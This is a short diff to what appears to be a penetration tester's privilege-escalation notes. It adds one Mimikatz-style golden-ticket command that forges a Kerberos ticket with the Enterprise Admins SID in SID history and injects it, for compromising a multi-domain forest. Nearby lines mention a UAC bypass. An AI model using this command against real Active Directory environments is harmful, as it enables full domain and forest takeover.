@@ -103,6 +103,7 @@ PrivEsc
     
   Multi-Domain (Forrest) compromise usiing Sid History
     https://adsecurity.org/?p=1640
+    kerberos::golden (/admin:Administrator|/user:DC_compname$) /domain:domain.fqdn /sid:child_domain_sid /sids:EA_Sid..-519 /krbtgt:krbtgt_hash /startoffset:0 /endin:600 /renewmax:10080 /ptt
     
   Bypass UAC Local
     Open CMD; Open another CMD (As Admin; select NO)
